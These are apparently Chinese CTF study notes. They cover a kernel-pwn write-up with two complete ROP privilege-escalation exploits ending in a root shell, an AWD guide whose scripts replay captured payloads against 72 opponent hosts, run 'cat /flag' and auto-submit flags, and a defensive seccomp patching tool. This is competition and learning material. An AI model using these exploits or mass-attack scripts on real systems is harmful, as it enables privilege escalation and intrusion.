user_eflags,user_sp; void save_stats() { asm( \"movq %%cs, %0\\n\" \"movq %%ss, %1\\n\" \"movq %%rsp, %3\\n\" \"pushfq\\n\" \"popq %2\\n\" :\"=r\"(user_cs), \"=r\"(user_ss), \"=r\"(user_eflags),\"=r\"(user_sp) : : \"memory\" ); } vmlinux中的函数偏移可以用脚本实现 from pwn import * elf = ELF('./core/vmlinux') print \"commit_creds\",hex(elf.symbols['commit_creds']-0xffffffff81000000) print \"prepare_kernel_cred\",hex(elf.symbols['prepare_kernel_cred']-0xffffffff81000000) 假如程序smep保护没开，那么内核态下也能执行用户空间的代码，就可以在exp中添加执行 commit_creds(prepare_kernel_cred(0)) 的函数（这么做的原因是可以少构造一段gadget，代码会短一点而已）。 smep保护可以直接从启动qemu的脚本boot.sh中查看，也可以通过 cat /proc/cpuinfo | grep smep 来查看，假如没有回显，那么就是未开启 用户态下构造commit_creds(prepare_kernel_cred(0))，前提是两个函数的地址已经知道。 void get_root() { char* (*pkc)(int) = prepare_kernel_cred; void (*cc)(char*) = commit_creds; (*cc)((*pkc)(0)); /* puts(\"[*] root now.\"); */ } swapgs & iretq 这两个片段都可以在vmlinux中找到，当然假如驱动里面有这些片段并且基地址已经泄露那么也是可以利用的。不过用ropper的时候要注意虚拟机内存和处理器内核数量设大一点，要不然会跑的很慢而且还不一定跑的出来。 exp编译 由于内核下是没有libc的所以我们把exp编译成静态 gcc -o exp exp.c -static 了解了上面这些内容那么exp确实已经相对好写了，因为内核态下的rop和用户态下的rop其实方法都是一样的，而且gadgets众多总有你喜欢的。。。这里头文件...能加的就加吧，反正加多又不出事。 下面分别给出两种exp 注：这里vmlinux泄露也可以通过栈泄露，但既然启动脚本init里有tmp/kallsyms那么我这里exp就直接去读取就完事。 1.执行内核中的commit_creds(prepare_kernel_cred(0)) （可以无视smep保护） 然后返回用户态后执行system(\"/bin/sh\") #include #include #include #include #include #include #include #include #include size_t vmlinux_base=0; size_t module_base; size_t canary; size_t commit_creds = 0x9c8e0; size_t prepare_kernel_cred = 0x9cce0; size_t prdi = 0xb2f; //pop rdi; ret; size_t prdx = 0xa0f49;//pop rdx; ret; size_t prcx = 0x21e53;//pop rcx; ret; size_t mrdi_rax_call_rdx= 0x1aa6a;//mov rdi, rax;call rdx; size_t swapgs = 0xa012da;//swapgs; popfq; ret; size_t iret=0x50ac2;// iretq; ret; unsigned long user_cs, user_ss, user_eflags,user_sp; void save_stats() { asm( \"movq %%cs, %0\\n\" \"movq %%ss, %1\\n\" \"movq %%rsp, %3\\n\" \"pushfq\\n\" \"popq %2\\n\" :\"=r\"(user_cs), \"=r\"(user_ss), \"=r\"(user_eflags),\"=r\"(user_sp) : : \"memory\" ); } void setoff(int fd,long long size){ ioctl(fd,0x6677889C,size); } void core_read(int fd,char *buf){ ioctl(fd,0x6677889b,buf); } void core_copy_func(int fd,long long size){ ioctl(fd,0x6677889a,size); } void get_shell(){ system(\"/bin/sh\"); } void get_vmlinux_base(){ FILE *fd = fopen(\"/tmp/kallsyms\",\"r\"); if(fd%p\\n\",vmlinux_base); printf(\"[*] commit_creds===>%p\\n\",commit_creds); printf(\"[*] prepare_kernel_cred===>%p\\n\",prepare_kernel_cred); fclose(fd); } int main(){ save_stats(); get_vmlinux_base(); int fd; fd = open(\"/proc/core\",O_RDWR); if(fd %p\\n\",canary); printf(\"[*] module_base===>%p\\n\",module_base); int i = 8; size_t rop[0x20]; rop[i++] = canary; rop[i++] = 0; rop[i++] = prdi; rop[i++] = 0 ; rop[i++] = prepare_kernel_cred; rop[i++] = prdx;//pop rdx; ret; rop[i++] = prcx;//pop rcx; ret rop[i++] = mrdi_rax_call_rdx;//mov rdi, rax;call rdx; rop[i++] = commit_creds; rop[i++] = swapgs;//swapgs; popfq; ret; rop[i++] = 0; rop[i++] = iret;// iretq; ret; rop[i++] = (size_t)get_shell; rop[i++] = user_cs; rop[i++] = user_eflags; rop[i++] = user_sp; rop[i++] = user_ss; write(fd,rop,0x100); core_copy_func(fd,0xf000000000000000+0x100); return 0; } 2.执行用户代码中的commit_creds(prepare_kernel_cred(0)) （ret2usr） #include #include #include #include #include #include #include #include #include size_t vmlinux_base=0; size_t module_base; size_t canary; size_t commit_creds = 0x9c8e0; size_t prepare_kernel_cred = 0x9cce0; size_t prdi = 0xb2f; //pop rdi; ret; size_t prdx = 0xa0f49;//pop rdx; ret; size_t prcx = 0x21e53;//pop rcx; ret; size_t mrdi_rax_call_rdx= 0x1aa6a;//mov rdi, rax;call rdx; size_t swapgs = 0xa012da;//swapgs; popfq; ret; size_t iret=0x50ac2;// iretq; ret; unsigned long user_cs, user_ss, user_eflags,user_sp; void save_stats() { asm( \"movq %%cs, %0\\n\" \"movq %%ss, %1\\n\" \"movq %%rsp, %3\\n\" \"pushfq\\n\" \"popq %2\\n\" :\"=r\"(user_cs), \"=r\"(user_ss), \"=r\"(user_eflags),\"=r\"(user_sp) : : \"memory\" ); } void setoff(int fd,long long size){ ioctl(fd,0x6677889C,size); } void core_read(int fd,char *buf){ ioctl(fd,0x6677889b,buf); } void core_copy_func(int fd,long long size){ ioctl(fd,0x6677889a,size); } void get_shell(){ system(\"/bin/sh\"); } void get_vmlinux_base(){ FILE *fd = fopen(\"/tmp/kallsyms\",\"r\"); if(fd%p\\n\",vmlinux_base); printf(\"[*] commit_creds===>%p\\n\",commit_creds); printf(\"[*] prepare_kernel_cred===>%p\\n\",prepare_kernel_cred); fclose(fd); } void get_root() { char* (*pkc)(int) = prepare_kernel_cred; void (*cc)(char*) = commit_creds; (*cc)((*pkc)(0)); /* puts(\"[*] root now.\"); */ } int main(){ save_stats(); get_vmlinux_base(); int fd; fd = open(\"/proc/core\",O_RDWR); if(fd %p\\n\",canary); printf(\"[*] module_base===>%p\\n\",module_base); int i = 8; size_t rop[0x20]; rop[i++] = canary; rop[i++] = 0; rop[i++] = (size_t)get_root; rop[i++] = swapgs;//swapgs; popfq; ret; rop[i++] = 0; rop[i++] = iret;// iretq; ret; rop[i++] = (size_t)get_shell; rop[i++] = user_cs; rop[i++] = user_eflags; rop[i++] = user_sp; rop[i++] = user_ss; write(fd,rop,0x100); core_copy_func(fd,0xf000000000000000+0x100); return 0; } "},"kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html":{"url":"kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html","title":"linux_kernel保护机制","keywords":"","body":"官方文档 https://www.kernel.org/doc/html/latest/security/self-protection.html SEMP禁止在内核态下执行用户空间的代码 SMAP禁止在内核态下直接访问用户空间的内存 "},"kernel_pwn/linux_kernel基础/linux_kernel基础.html":{"url":"kernel_pwn/linux_kernel基础/linux_kernel基础.html","title":"linux_kernel基础","keywords":"","body":" copy_to_user函数 #include unsigned long copy_to_user(void __user *to, const void *from, unsigned long n); 如果数据拷贝成功，则返回零；否则，返回没有拷贝成功的数据字节数。 *to是用户空间的指针， *from是内核空间指针， n表示从内核空间向用户空间拷贝数据的字节数 copy_from_user unsigned long copy_from_user(void * to, const void __user * from, unsigned long n) 第一个参数to是内核空间的数据目标地址指针， 第二个参数from是用户空间的数据源地址指针， 第三个参数n是数据的长度。 如果数据拷贝成功，则返回零；否则，返回没有拷贝成功的数据字节数。 "},"kernel_pwn/ropper简单使用/ropper简单使用.html":{"url":"kernel_pwn/ropper简单使用/ropper简单使用.html","title":"ropper简单使用","keywords":"","body":"ropper是用来找gadgets的用处和ROPgadget一样，但内核的vmlinux文件比较大用ROPgadget会跑的特别慢。下面简单的介绍用法。 安装 https://www.jianshu.com/p/e14c811496ac 使用方法 直接ropper进入交互界面 file命令 file加载要分析的文件 支持的架构 supported architectures: x86 [x86] x86_64 [x86_64] MIPS [MIPS, MIPS64] ARM/Thumb [ARM, ARMTHUMB] ARM64 [ARM64] PowerPC [PPC, PPC64] SPARC [SPARC64] ropper支持一次性加载多个文件，file可以查看加载进来的文件和文件标识，同时file [文件标识]可以切换当前选中文件 gadgets命令会列出所有的gadgets，实在是太多了，所以感觉一般不会这么用。 jmp指令 用search可以更加精准的查找相关的指令 semantic命令（实现一定功能的片段） 感觉只能跑跑小程序，大程序貌似不太跑的出来。 需要先安装依赖的库 pip3 install z3 pip3 install archinfo pip3 install pyvex 支持的约束命令 reg == reg - assign register to another reg == number - assign number to register reg == [reg] - assign memory to register reg += number/reg/[reg] reg -= number/reg/[reg] reg *= number/reg/[reg] reg /= number/reg/[reg] 示例： "},"awd/":{"url":"awd/","title":"awd","keywords":"","body":""},"awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html":{"url":"awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html","title":"awdpwn流量转发手动","keywords":"","body":"awd pwn中流量转发（手动） 例1：ciscn某次awd题目 eval 1.从服务器上扒下可执行程序 一般来讲，pwn的可执行文件在/home/ctf目录下，还是比较好找的，这里out就是我们要的附件，可以直接运行验证。 2.等大佬们的流量 一般来讲，假如给流量的话也会放在ctf目录下。 这个是当时在服务器上拉下来的流量，可以通过追踪TCP流来看人家的payload，一般来说流量的最后有这种cat flag的shell命令基本上就是能够成功攻击的流量了。 一般来讲，假如程序不需要泄露地址，一模一样的流量打过去也是可以成功的。 wireshark是可以把payload导出为c语言数组形式的。 那我们只需要写个脚本，把C语言的数组转化成python里的数组，然后一模一样发一遍过去就行了。 这里写了个简单的转化脚本 strip.py a = ''' char peer0_0[] = { /* Packet 28 */ 0x31, 0x33, 0x0a }; char peer0_1[] = { /* Packet 30 */ 0x30, 0x00, 0x07, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x33, 0x00 }; char peer0_2[] = { /* Packet 31 */ 0x65, 0x78, 0x65, 0x63, 0x20, 0x73, 0x68, 0x20, 0x2d, 0x69, 0x0a }; char peer0_3[] = { /* Packet 32 */ 0x74, 0x72, 0x61, 0x70, 0x20, 0x22, 0x22, 0x20, 0x31, 0x20, 0x32, 0x20, 0x33, 0x20, 0x34, 0x20, 0x35, 0x20, 0x36, 0x20, 0x37, 0x20, 0x38, 0x20, 0x39, 0x20, 0x31, 0x34, 0x20, 0x31, 0x35, 0x20, 0x31, 0x37, 0x0a }; char peer0_4[] = { /* Packet 33 */ 0x73, 0x68, 0x0a, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x61, 0x39, 0x30, 0x61, 0x33, 0x35, 0x35, 0x66, 0x38, 0x64, 0x64, 0x62, 0x61, 0x36, 0x62, 0x32, 0x3b, 0x63, 0x61, 0x74, 0x20, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x3b, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x64, 0x63, 0x36, 0x31, 0x61, 0x36, 0x65, 0x37, 0x31, 0x39, 0x35, 0x63, 0x61, 0x39, 0x39, 0x0a }; char peer0_5[] = { /* Packet 36 */ 0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x61, 0x33, 0x39, 0x36, 0x65, 0x61, 0x31, 0x33, 0x31, 0x63, 0x34, 0x38, 0x61, 0x32, 0x61, 0x0a }; char peer0_6[] = { /* Packet 39 */ 0x65, 0x63, 0x68, 0x6f, 0x20, 0x61, 0x39, 0x30, 0x61, 0x33, 0x35, 0x35, 0x66, 0x38, 0x64, 0x64, 0x62, 0x61, 0x36, 0x62, 0x32, 0x3b, 0x63, 0x61, 0x74, 0x20, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x3b, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x64, 0x63, 0x36, 0x31, 0x61, 0x36, 0x65, 0x37, 0x31, 0x39, 0x35, 0x63, 0x61, 0x39, 0x39, 0x0a }; char peer0_7[] = { /* Packet 44 */ 0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x61, 0x33, 0x39, 0x36, 0x65, 0x61, 0x31, 0x33, 0x31, 0x63, 0x34, 0x38, 0x61, 0x32, 0x61, 0x0a }; ''' ss = a.split(';')[:-1] ct = '' packets = [] for s in ss: tmp = s.strip('\\nchar ') tmp = tmp.replace('[]','') tmp1 = tmp.split('/') tmp2 = '' for i in range(len(tmp1)): if i!=1: tmp2+=tmp1[i] tmp2 = tmp2.replace('\\n','') tmp2 = tmp2.replace('{','[') tmp2 = tmp2.replace('}', ']') tmp2 = tmp2.replace(' ','') print tmp2 c = tmp2.split('[')[1] c = c.replace(']','') c = c.split(',') packet = '' for i in c: packet += chr(int(i,16)) packets.append(packet) for i in range(len(packets)): print 'packet'+str(i)+'=====>'+packets[i] , 执行效果 3.本地验证 验证脚本可以直接在strip.py的基础上直接修改 a = ''' char peer0_0[] = { /* Packet 28 */ 0x31, 0x33, 0x0a }; char peer0_1[] = { /* Packet 30 */ 0x30, 0x00, 0x07, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x33, 0x00 }; char peer0_2[] = { /* Packet 31 */ 0x65, 0x78, 0x65, 0x63, 0x20, 0x73, 0x68, 0x20, 0x2d, 0x69, 0x0a }; char peer0_3[] = { /* Packet 32 */ 0x74, 0x72, 0x61, 0x70, 0x20, 0x22, 0x22, 0x20, 0x31, 0x20, 0x32, 0x20, 0x33, 0x20, 0x34, 0x20, 0x35, 0x20, 0x36, 0x20, 0x37, 0x20, 0x38, 0x20, 0x39, 0x20, 0x31, 0x34, 0x20, 0x31, 0x35, 0x20, 0x31, 0x37, 0x0a }; char peer0_4[] = { /* Packet 33 */ 0x73, 0x68, 0x0a, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x61, 0x39, 0x30, 0x61, 0x33, 0x35, 0x35, 0x66, 0x38, 0x64, 0x64, 0x62, 0x61, 0x36, 0x62, 0x32, 0x3b, 0x63, 0x61, 0x74, 0x20, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x3b, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x64, 0x63, 0x36, 0x31, 0x61, 0x36, 0x65, 0x37, 0x31, 0x39, 0x35, 0x63, 0x61, 0x39, 0x39, 0x0a }; char peer0_5[] = { /* Packet 36 */ 0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x61, 0x33, 0x39, 0x36, 0x65, 0x61, 0x31, 0x33, 0x31, 0x63, 0x34, 0x38, 0x61, 0x32, 0x61, 0x0a }; char peer0_6[] = { /* Packet 39 */ 0x65, 0x63, 0x68, 0x6f, 0x20, 0x61, 0x39, 0x30, 0x61, 0x33, 0x35, 0x35, 0x66, 0x38, 0x64, 0x64, 0x62, 0x61, 0x36, 0x62, 0x32, 0x3b, 0x63, 0x61, 0x74, 0x20, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x3b, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x64, 0x63, 0x36, 0x31, 0x61, 0x36, 0x65, 0x37, 0x31, 0x39, 0x35, 0x63, 0x61, 0x39, 0x39, 0x0a }; char peer0_7[] = { /* Packet 44 */ 0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x61, 0x33, 0x39, 0x36, 0x65, 0x61, 0x31, 0x33, 0x31, 0x63, 0x34, 0x38, 0x61, 0x32, 0x61, 0x0a }; ''' ss = a.split(';')[:-1] ct = '' packets = [] for s in ss: tmp = s.strip('\\nchar ') tmp = tmp.replace('[]','') tmp1 = tmp.split('/') tmp2 = '' for i in range(len(tmp1)): if i!=1: tmp2+=tmp1[i] tmp2 = tmp2.replace('\\n','') tmp2 = tmp2.replace('{','[') tmp2 = tmp2.replace('}', ']') tmp2 = tmp2.replace(' ','') print tmp2 c = tmp2.split('[')[1] c = c.replace(']','') c = c.split(',') packet = '' for i in c: packet += chr(int(i,16)) packets.append(packet) for i in range(len(packets)): print 'packet'+str(i)+'=====>'+packets[i] , from pwn import* #context.log_level = 'debug' p = process('./pwn') for i in packets: p.send(i) sleep(0.1) p.interactive() 可以看到，在本地运行脚本已经可以拿到shell了。 假如想要验证远程是否可行，可以先把p = process('./pwn')换成 p = remote('',port)即可验证，第一个参数是ip地址，第二个参数是端口。 假如批量脚本没写出来就只能一个ip一个ip试过去了。 一般来讲context.log_level = 'debug'不用注释，会输出交互的信息。 4.批量脚本 这是当时批量的脚本，假如想要修改的话就把几个send换成本地验证那样发送就行。但有一个比较头疼的问题是是flag接收的问题，拿到shell之后可以采用echo 特定字符，然后recvuntil那些字符，最后再发送一遍cat flag并且recv就可以把它存进变量里并批量提交了 # -*- coding:utf-8 -*- from pwn import* import requests ok = 0 def submit(flag): url = 'http://10.10.10.10/api/v1/att_def/web/submit_flag/?event_id=21' data = {'flag':flag,'token':'NEQEKjQAW6YXqW7SSFMaEA8j4W5STUXVE7vuVDbtQmwDT'} ct = requests.post(url=url,data=data) print ct.content if ct.text.find('false')!=-1: print 'error!' else: print 'ok' ok += 1 def pr(a,addr): log.success(a+'====>'+hex(addr)) def pwn(target): p = remote('172.35.%d.15'%target,9999,timeout=2) p.sendlineafter('How big is your program: ','12') a1 = [ 0x30, 0x00, 0x07, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x33, 0x00 ] ct1 = '' for i in a1: ct1+=chr(i) p.send(ct1) p.sendline('echo a90a355f8ddba6b2;cat /flag;echo 9dc61a6e7195ca99') p.recvline() flag = p.recvline()[:-1] submit(flag) flags.append([target,flag]) print('flag====>'+flag) p.close() #context.log_level = 'debug' flags = [] ip = [56] ip = [x for x in range(1,73)] for i in ip: try: pwn(i) except: print('pwn error!') for i in flags: print str(i[0])+'===>'+i[1] print len(flags) print 'ok!!!==>'+str(ok) 例2：ciscn某次awd题目 cryptopark 选取流量 发了这么多，最后还cat flag，就决定是你了 本地验证 本地验证其实和刚刚一模一样。。只不过把这里a里面内容重新复制一下 a = ''' char peer0_0[] = { /* Packet 679 */ 0x35, 0x0a }; char peer0_1[] = { /* Packet 682 */ 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x0a }; char peer0_2[] = { /* Packet 685 */ 0x31, 0x0a }; char peer0_3[] = { /* Packet 687 */ 0x30, 0x0a }; char peer0_4[] = { /* Packet 689 */ 0x39, 0x38, 0x35, 0x0a }; char peer0_5[] = { /* Packet 691 */ 0x31, 0x30, 0x0a }; char peer0_6[] = { /* Packet 693 */ 0x39, 0x38, 0x35, 0x0a }; char peer0_7[] = { /* Packet 695 */ 0x31, 0x30, 0x0a }; char peer0_8[] = { /* Packet 697 */ 0x31, 0x0a }; char peer0_9[] = { /* Packet 699 */ 0x31, 0x0a }; char peer0_10[] = { /* Packet 701 */ 0x32, 0x0a }; char peer0_11[] = { /* Packet 704 */ 0x31, 0x0a }; char peer0_12[] = { /* Packet 707 */ 0x32, 0x0a }; char peer0_13[] = { /* Packet 710 */ 0x31, 0x0a }; char peer0_14[] = { /* Packet 713 */ 0x31, 0x0a }; char peer0_15[] = { /* Packet 716 */ 0x32, 0x0a }; char peer0_16[] = { /* Packet 719 */ 0x33, 0x0a }; char peer0_17[] = { /* Packet 722 */ 0x32, 0x0a }; char peer0_18[] = { /* Packet 725 */ 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x36, 0x0a }; char peer0_19[] = { /* Packet 728 */ 0x66, 0x6c, 0x61, 0x70, 0x70, 0x79, 0x62, 0x69, 0x72, 0x64, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x0a }; char peer0_20[] = { /* Packet 731 */ 0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x0a }; ''' ss = a.split(';')[:-1] ct = '' packets = [] for s in ss: tmp = s.strip('\\nchar ') tmp = tmp.replace('[]','') tmp1 = tmp.split('/') tmp2 = '' for i in range(len(tmp1)): if i!=1: tmp2+=tmp1[i] tmp2 = tmp2.replace('\\n','') tmp2 = tmp2.replace('{','[') tmp2 = tmp2.replace('}', ']') tmp2 = tmp2.replace(' ','') print tmp2 c = tmp2.split('[')[1] c = c.replace(']','') c = c.split(',') packet = '' for i in c: packet += chr(int(i,16)) packets.append(packet) for i in range(len(packets)): print 'packet'+str(i)+'=====>'+packets[i] , from pwn import* context.log_level = 'debug' p = process('./pwn') for i in packets: p.send(i) sleep(0.1) p.interactive() 脚本有效 批量脚本 当时写的脚本 # -*- coding:utf-8 -*- from pwn import* import requests def submit(flag): url = 'http://10.10.10.10/api/v1/att_def/web/submit_flag/?event_id=21' data = {'flag':flag,'token':'NEQEKjQAW6YXqW7SSFMaEA8j4W5STUXVE7vuVDbtQmwDT'} ct = requests.post(url=url,data=data) print ct.content if ct.text.find('false')!=-1: print 'error!' else: print 'ok' def pr(a,addr): log.success(a+'====>'+hex(addr)) def pwn(target): p = remote('172.35.%d.14'%target,9999,timeout=2) p.sendline('5') p.sendline('a'*0x78) p.sendline('1') p.sendline('0') p.sendline('985') p.sendline('10') p.sendline('985') p.sendline('10') p.sendline('1') p.sendline('1') p.sendline('2') p.sendline('1') p.sendline('2') p.sendline('1') p.sendline('1') p.sendline('2') p.sendline('3') p.sendline('2') p.sendline('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') p.sendline('6') p.sendline('flappybird666666') p.sendline('echo a90a355f8ddba6b2;cat /flag;echo 9dc61a6e7195ca99') p.recvuntil('a90a355f8ddba6b2') print '1===>'+p.recvline() flag = p.recvline()[:-1] print '3===>'+p.recvline() print 'flag====>'+flag flags.append([target,flag]) submit(flag) p.close() #context.log_level = 'debug' flags = [] ip = [x for x in range(1,73)] #ip = [68] for i in ip: try: pwn(i) except: print('pwn error!') for i in flags: print str(i[0])+'==>'+i[1] 要点 流量最后有一些shell命令的一般是成功利用的 假如利用是需要泄露libc信息的，那一模一样打还是大概率失败的 步骤总结：选取攻击流量->本地验证->拿自己的靶机远程验证->批量脚本 不建议很早就patch，要不然别人攻击流量就不完整了 被打了可以立马上ttypatch，毕竟攻击流量我们只需要一个能够成功的就行 "},"awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html":{"url":"awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html","title":"evilPatcher_pwn通防","keywords":"","body":"基于pwntools和seccomp-tools的awd pwn通防小工具 ​ 最初想法是搞到一种不影响程序本身运行，但是能够给程序禁用一些系统调用的方法。看了网上很多资料，感觉没有找到我想要的那种方法，有一些是环境我都搭不起来，也非常不好用，再有一些就是对文件本身内容改动太大了，而awd中假如check的脚本是本地运行的话是有可能check文件修改字节数的。那就只能自己动手，丰衣足食了。 工具说明 环境需求 ​ 运行需要依赖seccomps-tools和pwntools ​ seccomps-tools github地址 https://github.com/david942j/seccomp-tools 目录说明 sandboxs文件夹 ​ sandboxs里面存放了禁用的规则，这里根据自己的需要进行修改和选择。 实例（sandbox1.asm） A = sys_number A >= 0x40000000 ? dead : next A == execve ? dead : next A == open ? dead : next return ALLOW dead: return KILL test文件夹 ​ 执行./complie.sh生成四个可执行文件可供测试。 运行脚本命令 ​ 第一个参数是想要patch的elf文件，第二个参数是沙箱规则文件，可以从sandboxs文件夹里选，假如想输出更多的中间过程可以在最后参数加上一个1。 Usage: python evil_patcher.py elfFile sandboxFile python evil_patcher.py elfFile sandboxFile 1 (more detailed process message) 运行 ​ 结果输出一个patch过后的文件，文件名为原来文件加上.patch后缀，再改回原来的名字就可以开开心心传到靶机上了。 验证 禁用系统调用的两种方式 1.seccomp库实现 这种方法需要安装一些库文件 sudo apt install libseccomp-dev libseccomp2 seccomp 实例 #include #include #include int main(void){ scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); seccomp_load(ctx); char * str = \"/bin/sh\"; write(1,\"hello worldn\",12); syscall(59,str,NULL,NULL);//execve return 0; } ​ scmp_filter_ctx是过滤器的结构体 ​ seccomp_init对结构体进行初始化，若参数为SCMP_ACT_ALLOW，则过滤为黑名单模式；若为SCMP_ACT_KILL，则为白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的syscall。 ​ seccomp_rule_add用来添加一条规则，arg_cnt为0,表示我们直接限制execve,不管参数是什么，如果arg_cnt不为0,那arg_cnt表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截 ​ seccomp_load是应用过滤器,如果不调用seccomp_load则上面所有的过滤都不会生效 ​ 注意：编译的时候要在最后面加 -lseccomp ​ 这该种方式实现的话会涉及到堆的操作，会留下堆使用痕迹，出题一般不用这种，假如栈题倒是可以用。正常用倒是方便，直接调库就行。 2.prctl实现 实例 #include #include #include #include #include #include #include #include #include #include #include int main() { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); printf(\"start!\\n\"); system(\"id\"); return 0; } ​ 主要用到两个结构体sock_filter和sock_fprog，prog会作为参数传入prctl,这里禁用了execve，x64的情况下其系统调用号为59。 效果图 ​ ps：一种更快捷的方式是通过seccomp-tools，可以直接生成代码，不过得提前写好沙箱规则的文件，格式和sandboxs文件夹中的文件一样。 实现思路 1.修改_start代码块 ELF执行流程图 ​ 程序的入口默认情况下都是_start函数，这里主要就是调用了__libc_start_main。 函数原型 int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)); ​ main函数的地址就是第一个参数，那么我们可以修改这个参数为我们提前布置好的代码的地址，然后最后再跳转回main去执行正常流程，类似于病毒，不过这里藏得更深一点，病毒一般会修改程序入口点。 32位情况 pie未开启 ​ 情况比较简单，直接修改mov的第二个操作数为我们要跳转的地址就行。 pie开启 ​ 这里情况稍微特殊一点，push ds:(main_ptr - 3FC4)[ebx]指令长度为6个字节，lea ecx, (unk_2060 - 3FC4h)[ebx];push ecx;两条指令长度起来为7，所以后面的call ___libc_start_main指令其实往后移了一个字节，把hlt覆盖了。 64位情况 ​ 64位情况比较简单，都是修改mov或者lea的第二个参数就行，因为64位情况下是通过寄存器来传递参数的。 pie未开启 pie开启 2.prctl汇编实现 ​ 我们需要实现的其实是以下两个函数完成的事情，只不过我们现在使用系统调用来完成。 prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); ​ PR_SET_NO_NEW_PRIVS、PR_SET_SECCOMP、SECCOMP_MODE_FILTER这三个都是常数，那么只要解决prog和prctl系统调用汇编实现就行了。幸运的是pwntools对于系统调用汇编实现已经有了相应的模块，好耶，懒狗狂喜。 ​ 对于sock_filter和sock_fprog两个结构体可以当一维数组来看就行了，无脑push进栈就行了，不过最后还是需要进行堆栈平衡操作的，主要怕程序结束的时候异常。 注入代码放在哪？ .eh_frame节 ​ 正常编译处理的程序一般都会包含这个节区，里面主要记载一些异常处理的信息，一般是只读权限的，但是加载到内存的时候是有可能和.text节在同一个页，具有执行权限（之后发现ubuntu18.04编译出来的是如下图，但ubuntu16.04编译出来的.eh_frame并没有和.text节在一个段里） ​ 选择把shellcode注入到这个节上，这个节的长度也一般会>0x100个字节。 ​ 实现代码如下，不同情况汇编代码稍有区别，但思路一致。 3.修改段权限 ​ 编译出的文件.eh_frame节对应的那个段不一定有可执行权限，和编译器版本相关，那么我们只需要把.eh_frame节对应的那个段加上可执行权限就行。 ​ ps：假如想手动修改段权限可以用01Editor直接改，非常好用，学习ELF文件格式用它非常好用。 